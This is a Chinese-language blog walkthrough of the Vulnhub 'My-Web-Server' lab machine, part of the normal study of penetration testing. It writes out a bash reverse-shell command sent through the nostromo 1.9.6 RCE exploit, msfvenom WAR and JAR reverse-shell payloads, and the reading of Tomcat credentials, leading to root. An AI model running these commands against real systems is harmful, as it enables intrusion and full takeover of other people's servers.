---
title: 'My-Web-Server : Walkthrough'
date: 2020-06-08T00:45:28+08:00
author: 2hanx
layout: post
categories:
  - Vulnhub

---
### 主机识别

`arp-scan -l`

### 网络拓扑

| 计算机           | IP              |
| ------------- | --------------- |
| 本机（Win10）     | `192.168.1.105` |
| Kali          | `192.168.1.112` |
| My-Web-Server | `192.168.1.103` |

### 扫描端口和版本信息

`nmap -A 192.168.1.103`

![1.png](https://i.loli.net/2020/06/08/Un5CXuRQt4AKikV.png) 

扫描结果又是有多个 Web 应用，为了避免犯之前的错误，这里我进行扫描全部端口，不过结果并没有差异

### 访问 Web 并确定 Web 应用

根据 Nmap 扫描结果可知，服务器运行着不同的 Web 应用。经过 _dirb_ ，_searchsploit_ 等测试后，发现 **2222** 端口运行的 **nostromo 1.9.6** 服务器具有 RCE 漏洞

![2.png](https://i.loli.net/2020/06/08/w3eOKnu85mx46bj.png) 

![3.png](https://i.loli.net/2020/06/08/jRWF1eo3OY9KzGg.png) 

![4.png](https://i.loli.net/2020/06/08/QhTaMCZ2BL73ukg.png) 

运行 Python 脚本，发现可以利用成功

![5.png](https://i.loli.net/2020/06/08/lUrg3mziVLDS6Z9.png) 

### Getshell

既然服务器具有 RCE 漏洞并且可以利用，那么接下来我们就通过获取 shell 来更方便的执行命令

<pre><code class="language-python line-numbers">python2 47837.py 192.168.1.103 2222 "bash -c \"bash -i &gt;& /dev/tcp/192.168.1.112/4455 0&gt;&1\""
</code></pre>

Kali 监听 **4455** 端口，即可连接到 shell。之后使用 _find_ 在找该用户可写入的目录时我们发现该用户可以写 Tomcat 配置文件所在的目录

`find / -writable -type d 2>/dev/null`

![6.png](https://i.loli.net/2020/06/08/mFBD2OZrRX1sNIU.png) 

通过读 Tomcat 应用的用户文件（**/usr/local/tomcat/conf/tomcat-users.xml**），我们可以得到 Tomcat 的用户名和密码：`tomcat:@sprot0230sp`，使用该账户和密码登录 Tomcat 系统

![7.png](https://i.loli.net/2020/06/08/H93N57njXDa6P4G.png) 

在系统后台，我们可以通过上传 WAR file 来提高权限，并且可以在 Kali 平台上使用 _msfvenom_ 工具生成反向 shell 文件

<pre><code class="line-numbers">msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.112 LPORT=5566 -f war &gt; getshell.war
</code></pre>

![8.png](https://i.loli.net/2020/06/08/qki1g5XlWKHRUnc.png) 

### 提权

Kali 本地监听 **5566** 端口，浏览器访问 `http://192.168.1.103:8080/getshell/`路径即可反弹 shell

![9.png](https://i.loli.net/2020/06/08/fB6drVxwAvehJ3K.png) 

看来我们切换到了 _tomcat_ 账户下，并且发现可以 sudo 执行 `/usr/lib/jvm/adoptopenjdk-8-hotspot-amd64/bin/java` 工具，因此该工具是运行 java 程序，那么我们再使用 msfvenom 生成一个 java 格式的反向 shell 即可

`msfvenom -p java/shell_reverse_tcp LHOST=192.168.1.112 LPORT=7788 -f jar > getroot.jar`

![10.png](https://i.loli.net/2020/06/08/Jbu1SY5PUatDKN7.png) 

Kali 监听 **7788** 端口即可获得 root 权限

![11.png](https://i.loli.net/2020/06/08/oQtMOnwrpqJZBmx.png)